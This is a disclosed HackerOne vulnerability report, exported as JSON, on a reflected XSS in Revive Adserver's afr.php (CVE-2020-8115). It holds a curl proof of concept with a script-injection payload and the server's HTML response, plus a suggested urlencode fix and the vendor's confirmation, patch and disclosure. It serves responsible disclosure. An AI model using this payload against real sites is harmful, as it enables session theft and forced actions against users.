{"id":775693,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzU2OTM=","url":"https://hackerone.com/reports/775693","title":"Reflected XSS on www/delivery/afr.php","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-01-15T15:52:04.909Z","submitted_at":"2020-01-15T15:52:04.909Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jacopotediosi","url":"/jacopotediosi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/orEEFS9hBJJHpHzMyaHVcfv5/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2367,"url":"https://hackerone.com/revive_adserver","handle":"revive_adserver","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/367/4f47a5b4a364515d4bbdc17550d67ea5415363cd_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/367/4f47a5b4a364515d4bbdc17550d67ea5415363cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Revive Adserver","twitter_handle":"revive_adserver","website":"https://www.revive-adserver.com","about":"Revive Adserver is a free open source ad serving system"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8115"],"singular_disclosure_disabled":false,"disclosed_at":"2020-01-21T13:13:48.835Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-01-21T13:09:11.953Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"At line 4381, $_SERVER['QUERY_STRING'], which is an untrusted user input, is assigned to the $dest variable.\nThen at lines 4386-4387 $dest is printed into HTML code in two separate places.\n\nPoC:\n~~~~\ncurl \"domain.com/www/delivery/afr.php?refresh=10000\u0026\\\")',10000000);alert(1);setTimeout('alert(\\\"\"\n\u003c!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'\u003e\n\u003chtml xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'\u003e\n\u003chead\u003e\n\u003ctitle\u003eAdvertisement\u003c/title\u003e\n\n    \u003cscript type='text/javascript'\u003e\u003c!--// \u003c![CDATA[\n        setTimeout('window.location.replace(\"http://domain.com/www/delivery/afr.php?refresh=10000\u0026\")',10000000);alert(1);setTimeout('alert(\"\u0026loc=\")', 10000000);\n    // ]]\u003e --\u003e\u003c/script\u003e\u003cnoscript\u003e\u003cmeta http-equiv='refresh' content='10000;url=http://domain.com/www/delivery/afr.php?refresh=10000\u0026\")',10000000);alert(1);setTimeout('alert(\"\u0026loc='\u003e\u003c/noscript\u003e\n    \u003cstyle type='text/css'\u003e\nbody {margin:0; height:100%; background-color:transparent; width:100%; text-align:center;}\n\u003c/style\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\n\u003c/body\u003e\n\u003c/html\u003e\n~~~~\n\nSuggested remediation:\nI suggest to change line 4381 from `$dest = MAX_commonGetDeliveryUrl($conf['file']['frame']).'?'.$_SERVER['QUERY_STRING'];` to `$dest = MAX_commonGetDeliveryUrl($conf['file']['frame']).'?'.urlencode($_SERVER['QUERY_STRING']);` in both files /www/delivery/afr.php and /www/delivery_dev/afr.php\n\n## Impact\n\nAn attacker could use this XSS to steal session cookies (if readable via javascript, I didn't check) or transform it to a CSRF and cause involuntary actions to be performed by a privileged user","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-02-20T13:09:12.052Z","allow_singular_disclosure_after":-51761821.66431341,"singular_disclosure_allowed":true,"vote_count":14,"voters":["kickino","ali","0xelkomy","rzx007x","h4x0r_dz","omarelfarsaoui","giteshsharmanxtlvl","exception","zimmer75","spetr0x","and 4 more..."],"severity":{"rating":"medium","score":4.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":154,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/revive-adserver/revive-adserver","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6778661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report and detailed explanation of your findings.\n\nOne of our developers will take a closer look, and let you know whether this is a vulnerability or not, and what their follow up actions will be (if any). ","automated_response":false,"created_at":"2020-01-15T17:01:11.996Z","updated_at":"2020-01-15T17:01:11.996Z","actor":{"username":"erikgeurts","cleared":false,"url":"/erikgeurts","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/878/a7a35960c7fd0f0474c483f125a4dfb682e9b5ee_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6778664,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report, we will check and get back to you shortly.","automated_response":false,"created_at":"2020-01-15T17:01:24.483Z","updated_at":"2020-01-15T17:01:24.483Z","actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6787394,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"The vulnerability is confirmed. You can find a patch for `delivery_dev/afr.php` attached. The `delivery/afr.php` file will be generated when pushing to the repo.\n\nWe will get back to you with more information about the expected timeline. Thanks again for your report!","automated_response":false,"created_at":"2020-01-16T10:19:57.478Z","updated_at":"2020-01-16T10:19:57.478Z","actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":686402,"filename":"h1-775693.diff","type":"text/x-patch","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QEXhR63R6xxXiywev5J8mWC8?response-content-disposition=attachment%3B%20filename%3D%22h1-775693.diff%22%3B%20filename%2A%3DUTF-8%27%27h1-775693.diff\u0026response-content-type=text%2Fx-patch\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152613Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8a30b7d1e2838de685656789a29fd19fd205c202440f7ecb8620bd567cc5268b"}],"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6790556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mbeccati,\nThe patch seems ok to me\nThanks for the quickly response","automated_response":false,"created_at":"2020-01-16T12:14:16.203Z","updated_at":"2020-01-16T12:14:16.203Z","actor":{"username":"jacopotediosi","cleared":false,"url":"/jacopotediosi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/orEEFS9hBJJHpHzMyaHVcfv5/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6791910,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks. A 5.0.4 release is currently planned for next week. A security advisory email will be sent, disclosing the vulnerability. What name should we use to mention you?","automated_response":false,"created_at":"2020-01-16T15:03:45.998Z","updated_at":"2020-01-16T15:04:24.685Z","actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jacopotediosi","url":"/jacopotediosi"},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6792284,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, if you want a name for credits, you can use \"Jacopo Tediosi\"\nThanks a lot","automated_response":false,"created_at":"2020-01-16T15:41:42.424Z","updated_at":"2020-01-16T15:41:42.424Z","actor":{"username":"jacopotediosi","cleared":false,"url":"/jacopotediosi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/orEEFS9hBJJHpHzMyaHVcfv5/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6825929,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-01-21T13:09:11.981Z","updated_at":"2020-01-21T13:09:11.981Z","first_to_agree":true,"actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6826121,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2020-01-21T13:13:48.744Z","updated_at":"2020-01-21T13:13:48.744Z","actor":{"username":"mbeccati","cleared":false,"url":"/mbeccati","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Vb1MGAtUFpEE4kdMaxxr1ACZ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"revive_adserver","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}